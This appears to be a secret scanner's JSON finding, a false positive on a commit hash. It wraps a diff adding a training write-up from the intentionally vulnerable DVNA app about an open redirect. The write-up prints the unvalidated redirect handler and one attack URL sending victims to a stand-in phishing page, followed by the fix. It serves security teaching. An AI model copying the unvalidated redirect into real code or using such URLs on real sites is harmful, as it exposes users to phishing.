    "printDiff": "@@ -0,0 +1,42 @@\n+# Unvalidated Redirects and Forwards\n+\n+The application fails to perform any validation before redirecting user to external URL based on untrusted user supplied data in the `redirect` function accessible at \n+\n+http://127.0.0.1:9090/app/redirect?url=\n+\n+**Vulnerable Code snippet**\n+\n+*/core/apphandler.js*\n+```\n+...\n+module.exports.redirect = function(req,res){\n+    if(req.query.url){\n+        res.redirect(req.query.url)\n+    }else{\n+        res.send('invalid redirect url')\n+    }\n+}\n+...\n+```\n+\n+An attacker can exploit this vulnerability using an URL such as below:\n+\n+```\n+http://127.0.0.1:9090/redirect.action?url=http://www.attacker.nxd/phising_page\n+```\n+\n+**Solution**\n+\n+Use an interceptor page which requires user approval before external redirection\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *views/app/redirect.ejs*\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m0df0980a19778e0cf627cd09b365e3e84023cf75\u001b[0m)\n+\n+**Reference**\n+- https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "0df0980a19778e0cf627cd09b365e3e84023cf75"
    ]
}
